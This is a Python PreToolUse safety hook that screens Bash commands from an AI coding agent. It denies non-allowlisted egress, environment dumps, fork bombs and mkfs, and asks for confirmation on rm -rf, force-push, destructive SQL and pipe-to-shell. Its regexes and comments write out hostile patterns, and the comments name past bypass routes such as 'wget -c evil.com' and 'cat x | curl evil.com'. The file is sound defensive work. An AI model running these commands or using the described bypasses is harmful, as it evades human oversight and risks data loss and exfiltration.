#!/usr/bin/env python3
"""Bundled PreToolUse safety hook.

Reads a JSON payload from stdin per the Claude Code hook spec, returns
a JSON decision object on stdout. Refuses workspace-destructive Bash
commands, hosts outside the Agnes egress allowlist, and prompts for
admin mutations. A small set of org floor rules additionally denies
irreversibly destructive commands (mkfs, fork bomb) and requires user
confirmation for high-blast-radius ones (recursive force delete, git
force-push, destructive SQL, pipe-to-shell).

Commands are scanned per shell segment (split on ``;``, ``&&``, ``||``,
``&`` and newlines, with common wrappers like ``sudo``/``nohup``
stripped) so a chained command can't slip a match past a prefix check.
The splitter is deliberately quote-naive: a separator inside a quoted
string still starts a new scan segment, which can over-ask (e.g. on an
echoed string containing ``rm -rf``) but never under-blocks — the safe
failure direction.

Operators with an Initial Workspace Template override take
responsibility for shipping an equivalent hook (admin UI warns at
template upload time if absent).
"""

from __future__ import annotations

import json
import re
import shlex
import sys

ALLOWED_HOSTS = {
    "127.0.0.1",
    "localhost",
    "api.anthropic.com",
    "api.github.com",
}

DESTRUCTIVE_PATHS = ("workspace/snapshots/", "workspace/scripts/")
DESTRUCTIVE_PREFIXES = ("rm ", "rm\t", "unlink ", "truncate -s 0", "shred ")

ADMIN_PROMPT_PREFIXES = (
    "agnes admin grant",
    "agnes admin group",
    "agnes admin user",
)

_ENUM_PREFIXES = ("find /", "ls /home", "ls /etc", "cat /etc/", "cat /proc/")


# curl/wget flags that consume the FOLLOWING token as their value (so that
# token is an argument, never the request target). Skipping their values
# stops a dotted filename like `--output results.example.csv` from being
# misread as a bare host and denied.
#
# The sets are PER-TOOL because the same short letter takes a value in one
# tool but NOT the other, and a wrong "takes a value" entry skips the token
# after it — which can be the real request target (an egress bypass). E.g.
# `-c` is curl's `--cookie-jar` (value) but wget's `--continue` (no arg): a
# shared set made `wget -c evil.com` skip `evil.com` and slip past the
# allowlist. curl's `-O`/`--remote-name` likewise takes no arg (wget's does).
# So we pick the set by the invoked tool and only list flags we're confident
# take a value for THAT tool — the failure direction stays safe: an omitted
# value-flag at worst over-blocks (its value re-checked as a host), never
# under-blocks the real target. (Devin + security review on #847/#848.)
#
# Deliberately NOT listed for either tool — flags whose value IS (or can carry)
# the real network destination, so the value must keep being host-checked:
#   -x / --proxy        the proxy value is the actual TCP peer for the request.
#   -K / --config       a curl config file can carry url=/proxy=/header=.
#   --resolve / --connect-to  pin/redirect the connection to an arbitrary peer.
#   -O                  curl `-O`/`--remote-name` takes NO argument.
_CURL_VALUE_FLAGS = {
    "-o",
    "--output",
    "-d",
    "--data",
    "--data-binary",
    "--data-raw",
    "--data-urlencode",
    "--data-ascii",
    "-H",
    "--header",
    "-A",
    "--user-agent",
    "-e",
    "--referer",
    "-b",
    "--cookie",
    "-c",
    "--cookie-jar",
    "-F",
    "--form",
    "-u",
    "--user",
    "-T",
    "--upload-file",
    "-E",
    "--cert",
    "--key",
    "--cacert",
    "-w",
    "--write-out",
    "-m",
    "--max-time",
    "--connect-timeout",
    "--retry",
    "-U",
    "--proxy-user",
}
_WGET_VALUE_FLAGS = {
    "-O",
    "--output-document",
    "-o",
    "--output-file",
    "-a",
    "--append-output",
    "--header",
    "-U",
    "--user-agent",
    "--referer",
    "-P",
    "--directory-prefix",
    "-t",
    "--tries",
    "-T",
    "--timeout",
    "-w",
    "--wait",
    "--user",
    "--password",
    "--post-data",
    "--post-file",
    "-A",
    "--accept",
    "-R",
    "--reject",
    "-D",
    "--domains",
    "-Q",
    "--quota",
    "--limit-rate",
    "-e",
    "--execute",
    "--bind-address",
    "--load-cookies",
    "--save-cookies",
    "--http-user",
    "--http-password",
    "--certificate",
    "--private-key",
    "--ca-certificate",
}
_VALUE_TAKING_FLAGS = {"curl": _CURL_VALUE_FLAGS, "wget": _WGET_VALUE_FLAGS}

# Org floor rules — hold regardless of chaining or workspace-template intent.
# Deny: irreversible, no legitimate analyst use. Ask: legitimate but
# high-blast-radius, so the user confirms in chat before it runs.
_FORK_BOMB_RE = re.compile(r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:")
_DESTRUCTIVE_SQL_RE = re.compile(r"\bdrop\s+(?:table|schema|database)\b|\btruncate\s+table\b", re.IGNORECASE)
# downloader output piped into a shell (optionally via sudo/env)
_PIPE_TO_SHELL_RE = re.compile(r"\b(?:curl|wget)\b[^|;&]*\|\s*(?:sudo\s+)?(?:env\s+\S+\s+)?(?:ba|z|da)?sh\b")
_FORCE_PUSH_FLAGS = {"-f", "--force", "--force-with-lease"}

# Wrappers that prefix the real command; stripped before token checks so
# `sudo rm -rf` matches the same rules as `rm -rf`. timeout's duration and
# leading VAR=val assignments after env are skipped too. Anything fancier
# (nested `sh -c`, eval, command substitution) is out of scope for this
# hook — network-layer controls remain the enforcement backstop.
_WRAPPERS = {"sudo", "nohup", "command", "exec", "time", "nice", "env", "timeout", "stdbuf"}


def _split_segments(cmd: str) -> list[str]:
    """Split a command line into independently-scanned shell segments.

    A single ``|`` splits too: the downstream side of a pipe is its own
    command, and the bare-host egress check only inspects a segment's
    first token, so ``cat x | curl evil.com`` would otherwise never
    host-check the ``curl`` (its first token is ``cat``). Splitting on a
    single ``|`` also covers ``||`` and ``&&`` (the empty middle piece is
    dropped), so the whole ``[;&|\\n]`` class is one character set. The
    pipe-to-shell rule runs over the WHOLE command before this split, so
    it still sees ``curl … | sh`` intact."""
    parts = re.split(r"[;&|\n]", cmd)
    return [p.strip() for p in parts if p.strip()]


def _tokens(seg: str) -> list[str]:
    try:
        return shlex.split(seg)
    except ValueError:
        return seg.split()


def _unwrap(toks: list[str]) -> list[str]:
    """Strip leading wrapper commands / their immediate args / VAR=val."""
    i = 0
    while i < len(toks):
        t = toks[i]
        if t in _WRAPPERS:
            i += 1
            if t == "timeout" and i < len(toks) and re.fullmatch(r"\d+[smhd]?", toks[i]):
                i += 1
            continue
        if "=" in t and re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*=.*", t):
            i += 1
            continue
        if t.startswith("-"):
            # wrapper flags (nice -n 10, stdbuf -oL, sudo -u): skip the flag;
            # a following bare number is its value
            i += 1
            if i < len(toks) and re.fullmatch(r"\d+|\w+", toks[i]) and toks[i - 1] in ("-n", "-u"):
                i += 1
            continue
        break
    return toks[i:]


def _is_env_dump(seg: str) -> bool:
    """True if the segment dumps the process environment, seeing through
    leading wrappers (``sudo env``, ``nice printenv``).

    ``env``/``printenv`` with no trailing command leak the whole
    environment; ``env FOO=bar cmd`` merely *runs* cmd (which is unwrapped
    and scanned separately), so it is not a pure dump. ``env`` is NOT
    stepped over here (it is the dump command itself), unlike in
    ``_unwrap`` where it is a wrapper — so this can't be defeated by the
    same wrapper-stripping that made the old raw-string check miss
    ``sudo env`` (security review on #1141)."""
    toks = _tokens(seg)
    i = 0
    while i < len(toks):
        t = toks[i]
        if t in _WRAPPERS and t != "env":
            i += 1
            if t == "timeout" and i < len(toks) and re.fullmatch(r"\d+[smhd]?", toks[i]):
                i += 1
            continue
        if t.startswith("-"):
            i += 1
            continue
        break
    rest = toks[i:]
    if not rest:
        return False
    head = rest[0]
    if head == "printenv":
        return True  # printenv [VAR] still leaks env values
    if head == "env":
        # a trailing non-flag token (VAR=val or a command) → not a pure dump
        return not [t for t in rest[1:] if not t.startswith("-")]
    return False


def _rm_recursive_force(toks: list[str]) -> bool:
    if not toks or toks[0] != "rm":
        return False
    short = "".join(t[1:] for t in toks[1:] if t.startswith("-") and not t.startswith("--"))
    has_r = "r" in short or "R" in short or "--recursive" in toks
    has_f = "f" in short or "--force" in toks
    return has_r and has_f


def _bare_hosts(toks: list[str]) -> list[str]:
    """Bare hosts given as curl/wget arguments (scheme-defaulting)."""
    hosts = []
    if toks and toks[0] in ("curl", "wget"):
        value_flags = _VALUE_TAKING_FLAGS[toks[0]]
        skip_next = False
        for t in toks[1:]:
            if skip_next:
                # this token is the value of the preceding value-taking flag
                skip_next = False
                continue
            if t.startswith("-"):
                # `--flag=value` carries its own value; `--flag value` consumes
                # the next token. `=` form is self-contained, so only arm the
                # skip for the separate-token form of a value-taking flag OF THE
                # INVOKED TOOL (the same letter differs between curl and wget).
                if t in value_flags:
                    skip_next = True
                continue
            cand = t.split("/")[0].split(":")[0]
            if "." in cand and not cand.startswith("http"):
                hosts.append(cand)
    return hosts


def _scan(cmd: str) -> list[tuple[str, str]]:
    """Collect every (decision, reason) the command trips, across segments."""
    verdicts: list[tuple[str, str]] = []

    # Whole-command checks first: these patterns span segment separators
    # (`:|:&` contains `&`, pipe-to-shell contains `|`) or live inside
    # quoted SQL strings, so segment-splitting would hide them.
    if _FORK_BOMB_RE.search(cmd):
        verdicts.append(("deny", "Refusing a fork bomb."))
    if _DESTRUCTIVE_SQL_RE.search(cmd):
        verdicts.append(
            (
                "ask",
                "Destructive SQL (DROP/TRUNCATE) — confirm with the user before running.",
            )
        )
    if _PIPE_TO_SHELL_RE.search(cmd):
        verdicts.append(
            (
                "ask",
                "Piping a download into a shell executes unreviewed remote code; confirm before running.",
            )
        )
    # schemed URLs anywhere in the command
    for u in re.findall(r"https?://([^/\s'\"]+)", cmd):
        host = u.split(":")[0]
        if host not in ALLOWED_HOSTS:
            verdicts.append(("deny", _egress_reason(host)))

    for seg in _split_segments(cmd):
        toks = _unwrap(_tokens(seg))
        unwrapped_lower = " ".join(toks).lower()

        # Env reconnaissance — seen through wrappers (``env``/``printenv``
        # dump their whole environment; unwrap alone strips ``env`` as a
        # wrapper, so this is checked on the raw segment via _is_env_dump).
        if _is_env_dump(seg) or unwrapped_lower.startswith("cat /proc/self/environ"):
            verdicts.append(("deny", "Refusing to dump the process environment."))
            continue

        if not toks:
            continue

        # Destructive ops against persistent workspace dirs
        if any(p in seg for p in DESTRUCTIVE_PATHS) and any(
            unwrapped_lower.startswith(pref) for pref in DESTRUCTIVE_PREFIXES
        ):
            verdicts.append(
                (
                    "deny",
                    "Refusing to delete from persistent workspace/snapshots or workspace/scripts. "
                    "Use a fresh path or ask the user explicitly.",
                )
            )

        # Filesystem enumeration outside the workspace
        if any(unwrapped_lower.startswith(p) for p in _ENUM_PREFIXES):
            verdicts.append(("deny", "Refusing to enumerate outside the working directory."))

        # Floor: irreversible destruction
        if toks[0].startswith("mkfs"):
            verdicts.append(("deny", "Refusing to build a filesystem over a device (mkfs)."))

        # Floor: high-blast-radius, user confirms
        if _rm_recursive_force(toks):
            verdicts.append(
                (
                    "ask",
                    "Recursive force delete (rm -rf) — confirm with the user before running.",
                )
            )
        if toks[:2] == ["git", "push"] and any(t in _FORCE_PUSH_FLAGS for t in toks[2:]):
            verdicts.append(("ask", "Force push rewrites remote history; confirm with the user before running."))

        # Outbound network — bare curl/wget hosts (scheme-defaulting)
        for host in _bare_hosts(toks):
            if host not in ALLOWED_HOSTS:
                verdicts.append(("deny", _egress_reason(host)))

        # Admin mutations need user confirmation
        if any(unwrapped_lower.startswith(p) for p in ADMIN_PROMPT_PREFIXES):
            verdicts.append(
                (
                    "ask",
                    "This command mutates the Agnes access-control layer; confirm before running.",
                )
            )

    return verdicts


def _egress_reason(host: str) -> str:
    return f"Outbound network to {host!r} is not in the Agnes egress allowlist. Allowed: " + ", ".join(
        sorted(ALLOWED_HOSTS)
    )


def _decide(payload: dict) -> dict:
    tool = payload.get("tool_name")
    if tool != "Bash":
        return {"permissionDecision": "allow"}
    cmd = (payload.get("tool_input") or {}).get("command", "")
    if not isinstance(cmd, str):
        return {"permissionDecision": "allow"}

    verdicts = _scan(cmd)
    # deny beats ask; first reason of the winning class is reported
    for decision in ("deny", "ask"):
        for verdict, reason in verdicts:
            if verdict == decision:
                return {"permissionDecision": verdict, "permissionDecisionReason": reason}
    return {"permissionDecision": "allow"}


def main() -> None:
    try:
        payload = json.loads(sys.stdin.read() or "{}")
    except json.JSONDecodeError:
        payload = {}
    sys.stdout.write(json.dumps(_decide(payload)))
    sys.stdout.flush()


if __name__ == "__main__":
    main()
